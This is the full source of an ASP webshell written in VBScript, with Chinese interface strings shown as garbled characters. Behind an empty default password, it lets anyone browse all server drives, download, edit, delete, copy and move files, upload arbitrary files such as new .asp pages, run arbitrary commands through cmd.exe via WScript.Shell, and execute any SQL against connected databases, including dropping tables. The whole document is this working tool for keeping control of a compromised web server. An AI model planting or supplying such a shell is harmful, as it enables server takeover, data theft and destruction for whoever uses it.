<%
Server.ScriptTimeout=50000
Response.Buffer = True
On Error Resume Next
ApplicationName = "�������ר��"                        
UserPass        = ""                               
ShowFileIco     = flase                                  
IcoPath         = "http://www.GXGL.com/images/FileType/"
URL             = Request.ServerVariables("URL")
ServerIP        = Request.ServerVariables("LOCAL_ADDR")
BackUrl         = Request.ServerVariables("HTTP_REFERER")
Action          = Request("Action")
RootPath        = Server.MapPath(".")
WWWRoot         = Server.MapPath("/")
FolderPath      = Request("FolderPath")
FName           = Request("FName")

If Session("GXGL")<>UserPass Then
  If Request.Form("LoginPass")<>"" Then
    If Request.Form("LoginPass")=UserPass Then
      Session("GXGL")=UserPass
      Response.Redirect BackUrl
    Else
	 response.write"��֤δͨ����"
    End If
  Else
    Response.Write"<center><br><br>�������ר��<br><br>"
    Response.Write"<form action='"&URL&"' method='post' name='lform'>"
    Response.Write"PassWord��<input name='LoginPass' type='password' size='15'>"
    Response.Write"&nbsp;<input type='submit' value='ENTER'></form></center>"
  End If
  Response.End
End If

sub ShowErr()
  If Err Then
    Response.Write"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If		
end sub

Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function

Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If

If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function IsIco(ia,ib,ta)
	If ShowFileIco=true Then
      IsIco = " <img src='"&IcoPath&ia&"'> "
	  If ib<>"" Then
	  IsIco = "<img src='"&IcoPath&ib&"'> "
	  End If
	Else
	  IsIco = "&nbsp;<font face='wingdings' color='#006600' size='3'>"&ta&"</font>  "
	End If
End Function

Function MainForm()
  SI="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
  SI=SI&"<input type=""hidden"" name=""Action"">"
  SI=SI&"<input type=""hidden"" name=""FName"">"
  SI=SI&"</form>"
  SI=SI&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  SI=SI&"<tr><td height='30' colspan='2'>"
  SI=SI&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
  SI=SI&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
  SI=SI&"<tr><td width='60' align='center'>��ַ����</td><td>"
  SI=SI&"<input type='text' name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
  SI=SI&"</td><td width='60' align='center'><input name='Submit' type='submit' value='ת��'>" 
  SI=SI&"</td></tr></form></table></td></tr><tr><td width='160'>"
  SI=SI&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
  SI=SI&"<td>"
  SI=SI&"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
  SI=SI&"</td></tr></table>"
  Response.Write SI
End Function

Function MainMenu()
  SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<tr><td height='5'></td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&IsIco("minus.gif","computer.gif","o")
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>"&ServerIP&"</a>"
  SI=SI&"</td></tr>"
  Set FSO=server.createobject("scripting.filesystemobject")
  For Each D in FSO.Drives
    SI=SI&"<tr><td>&nbsp;&nbsp;"
    SI=SI&IsIco("plus.gif","driver.gif","v")
    SI=SI&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>���ش��� ("&D.DriveLetter&":)</a>" 
    SI=SI&"</td></tr>"
  Next
  Set FSO=Nothing
  Response.Write SI : SI=""

  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI& IsIco("minus.gif","folder.gif","0")
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>���ظ�Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI& IsIco("minus.gif","newfolder.gif","1")
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>�½�Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&IsIco("minus.gif","newfile.gif","2")
  SI=SI&"<a href='?Action=EditFile' target='FileFrame'>�½��ı�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&IsIco("minus.gif","main.gif","8")
  SI=SI&"<a href='?Action=UpFile' target='FileFrame'>�ϴ��ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&IsIco("plus.gif","main.gif","o")
  SI=SI&"���ݿ����"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&IsIco("minus.gif","newfile.gif","4")
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&IsIco("minus.gif","mdb.gif","4")
  SI=SI&"<a href='?Action=DbManager' target='FileFrame'>���ݿ����</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&IsIco("minus.gif","zip.gif","4")
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>ѹ��MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&IsIco("minus.gif","cmd.gif","o")
  SI=SI&"<a href='?Action=CmdShell' target='FileFrame'>������</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&IsIco("minus.gif","main.gif","f")
  SI=SI&"<a href='?Action=Logout' target='_top'>�˳���¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&IsIco("minus.gif","htm.gif","f")
  SI=SI&"<a href='http://www.gxgl.com' target='_blank'>�����ϱ�վ</a>"
  SI=SI&"</td></tr>"
  SI=SI&"</table>"
  Response.Write SI
End Function


Function FileIco(FName)
  If ShowFileIco=true Then
    TypeList = ".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml.zip"
    FileType = lcase(Mid(FName, InstrRev(FName,".")+1))
    If Instr(TypeList,"."&FileType)>0 then
      Ico = FileType&".gif"
    Else
      Ico = "default.gif"
    End If
  
    FileIco = "<img src='"&IcoPath&Ico&"' border='0'> "
  Else 
    FileIco="<font face='wingdings' color='#006600' size='3'>2</font> "
  End If
End Function
  
Function ShowFile(Path)
  SET FSO=server.createobject("scripting.filesystemobject")
  Set FOLD=FSO.GetFolder(Path)
  i=0
    SI="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#EFEFEF'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td>"
	SI=SI&IsIco("","folder.gif","0")
    SI=SI&" <a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>"&F.Name&"</a>" 
    SI=SI&" | <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>copy</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>move</a>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=5></td></tr></table>"
	Response.Write SI : SI=""
  
  For Each L in Fold.files
    SI="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
    SI=SI&"<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''"">"
    SI=SI&"<td height='20'>"&FileIco(L.Name)
	SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'>"&L.Name&"</a></td>"
    SI=SI&"<td width='140'>"&L.Type&"</td>"
    SI=SI&"<td width='50'>"&clng(L.size/1024)&"K</td>"
    SI=SI&"<td width='120'>"&L.DateLastModified&"</td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>edit</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>copy</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>move</a></td>"
    SI=SI&"</tr></table>"
	Response.Write SI : SI=""
  Next
  Set FOLD=Nothing
  Set FSO=Nothing
End Function

Function DownFile(Path)
  Response.Clear
  Set OSM = Server.CreateObject("ADODB.Stream")
  OSM.Open
  OSM.Type = 1
  OSM.LoadFromFile Path
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Path
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite OSM.Read
    Response.Flush
  OSM.Close
  Set OSM = Nothing
End Function

Function DelFile(Path)
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FileExists(Path) Then
	  FSO.DeleteFile Path
      SI="<center><br><br><br>�ļ� "&Path&" ɾ���ɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI
	End If
  Set FSO=Nothing
End Function


Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    HTMLEncode = S
  end if
End Function

Function EditFile(Path)
  If Request("Action2")="Post" Then
    Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
      Set T=FSO.CreateTextFile(Path)
        T.WriteLine Request.form("content")
        T.close
      Set T=nothing
    Set FSO=nothing
    SI="<center><br><br><br>�ļ�����ɹ���</center>"
    SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
    Response.Write SI
	Response.End
  End If
  
  If Path<>"" Then
    Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    Set T=FSO.opentextfile(Path, 1, False)
    Txt=HTMLEncode(T.readall) 
    T.close
    Set T=Nothing
    Set FSO=Nothing
  Else
    Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�"
  End If
  
  SI="<table width='100%' height='100%'><tr><td valign='top' align='center'>"  
  SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
  SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
  SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
  SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
  SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
  SI=SI&"</td></tr></table></body></html>"
  Response.Write SI
End Function

Function CopyFile(Path)
  Path = Split(Path,"||||")
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FileExists(Path(0)) and Path(1)<>"" Then
	  FSO.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path&"���Ƴɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI 
	End If
  Set FSO=Nothing
End Function

Function MoveFile(Path)
  Path = Split(Path,"||||")
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FileExists(Path(0)) and Path(1)<>"" Then
	  FSO.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path&"�ƶ��ɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI 
	End If
  Set FSO=Nothing
End Function

Function DelFolder(Path)
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FolderExists(Path) Then
	  FSO.DeleteFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI
	End If
  Set FSO=Nothing
End Function

Function CopyFolder(Path)
  Path = Split(Path,"||||")
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FolderExists(Path(0)) and Path(1)<>"" Then
	  FSO.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path&"���Ƴɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI
	End If
  Set FSO=Nothing
End Function

Function MoveFolder(Path)
  Path = Split(Path,"||||")
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If FSO.FolderExists(Path(0)) and Path(1)<>"" Then
	  FSO.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path&"�ƶ��ɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI
	End If
  Set FSO=Nothing
End Function

Function NewFolder(Path)
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
    If Not FSO.FolderExists(Path) and Path<>"" Then
	  FSO.CreateFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
      SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	  Response.Write SI
	End If
  Set FSO=Nothing
End Function

Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
	Response.Write SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' size='40'>&nbsp;"
    SI=SI&"<input name='LocalFile' type='file'  size='25'>"
    SI=SI&"<input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  Response.Write SI
End Function

Function CmdShell()
  If Request("cmd")<>"" Then
    DefCmd = Request("cmd")
  Else
    DefCmd = "Dir "&Session("FolderPath")
  End If
  SI="<form method='post'><input type=text name='cmd' Style='width:95%;background-color:#000000;color:#FFFFFF' value='"&DefCmd&"'>"
  SI=SI&"<input type='submit' value='ִ��'>"
  SI=SI&"<textarea readonly  Style='width:100%;height:520;background-color:#000000;color:#FFFFFF'>"
  SI=SI&server.createobject("wscript.shell").exec("D:\www\IhostUser\shenlan\soft\cmd.exe /c "&DefCmd).stdout.readall
  SI=SI&Chr(13)&"Rar������ѹ��ʾ����c:\progra~1\winrar\rar.exe a d:\web\test\web1.rar d:\web\test\web1</textarea></form>"
  Response.Write SI
End Function

Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = Server.CreateObject("ADOX.Catalog") 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "�����ɹ�!"
   End If
   SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>" 
   Response.Write SI
End function 

Function CompactMdb(Path)
  Set FSO=Server.CreateObject("Scripting.FilesyStemobject")
  If FSO.FileExists(Path) Then
    Set C=Server.CreateObject("JRO.JetEngine") 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�з��֣�</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ���ɹ���</center>"
  End If
  SI=SI&"<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"
  Response.Write SI
End Function


Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")

  SI=SI&"<table width='100%'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'> &nbsp;���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' type='text' style='width:100%' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'>&nbsp;SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' type='text' style='width:100%' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table>"
  Response.Write SI:SI=""

  If Len(DbStr)>40 Then
  
  Set Conn=Server.CreateObject("Adodb.Connection")
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  Response.Write SI:SI=""
	  
	  
	  
If Len(SqlStr)>10 Then

  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"ִ����䣺"&SqlStr
    Set Rs=Server.CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"

    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	
	Response.Write SI:SI=""
	
	SqlStr=HtmlEnCode(SqlStr)

    SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&"&nbsp;ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&"&nbsp;"
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	
	Response.Write SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL��䣺"&SqlStr
  End If

  Response.Write SI:SI=""
End If

  Conn.Close
  Set Conn=Nothing
  End If
End Function
%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=ApplicationName&" - "&ServerIP%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#FFFFFF;}
  .tr {background-color:#EFEFEF;}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
  a {color: black;text-decoration: none;}
  .am {color: #003366;font-size: 11px;}
-->
</style>

<script language="javascript">
<!--
  function yesok(){
    if (confirm("ȷ��Ҫִ�д˲�����"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }

  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("�����븴�Ƶ�Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("�������ƶ���Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("������Ҫ�½����ļ���ȫ����",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("������Ҫ�½���Mdb�ļ�ȫ����,ע�ⲻ��ͬ����",FName);
        top.hideform.FName.value = DName;
	}else if(FAction=="CompactMdb"){
	    DName = prompt("������Ҫѹ����Mdb�ļ�ȫ����,ע���ļ��Ƿ���ڣ�",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	
	if(DName!=null){
      top.hideform.Action.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("�����������ݿ�");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\db.mdb";
	Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'gxgl_com\',\'mypass\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'gxgl_com\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	}else if(i=12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("�������ݿ����Ӵ��Ƿ���ȷ!")
	  return false;
	}
    if(str.length<10){
	  alert("����SQL����Ƿ���ȷ!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	DbForm.submit();
    return true;
  }
-->
</script>
</head>
<body>
<%
Dim T1
Class UPC
  Dim D1,D2

  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function

  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=Server.CreateObject("Scripting.Dictionary")
	if Request.TotalBytes<1 then Exit Sub
    set T1 = Server.CreateObject("Adodb.Stream")
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=Server.CreateObject("Scripting.Dictionary")
	vbCrlf = chrB(13) & chrB(10)
    set T2 = Server.CreateObject("Adodb.Stream")
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject("Adodb.Stream")
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class

